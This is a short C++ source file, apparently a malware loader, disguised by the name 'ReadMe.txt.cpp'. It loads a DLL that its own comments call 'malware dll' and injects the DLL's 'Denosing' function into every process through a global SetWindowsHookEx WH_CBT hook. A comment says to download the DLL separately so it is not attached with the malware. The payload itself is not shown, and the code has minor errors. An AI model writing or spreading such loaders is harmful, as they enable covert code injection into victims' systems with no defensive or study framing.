// ReadMe.txt.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>;
#include <cstdio>;
typedef int(_cdecl* ReadMe)();
int main(void)
{//download or create ddl so its not attached with malware.
	HINSTANCE Dls; 
	ReadMe reading;
	Dls = LoadLibrary(TEXT("dllmain.dll"));//malware dll
	reading = (ReadMe)GetProcAddress(Dls, "Denosing");
	HHOOK clip = SetWindowsHookEx(WH_CBT, (HOOKPROC)reading, Dls, 0);
	Sleep(100091);
	//WH_CBT call on windows create and destroy events.
}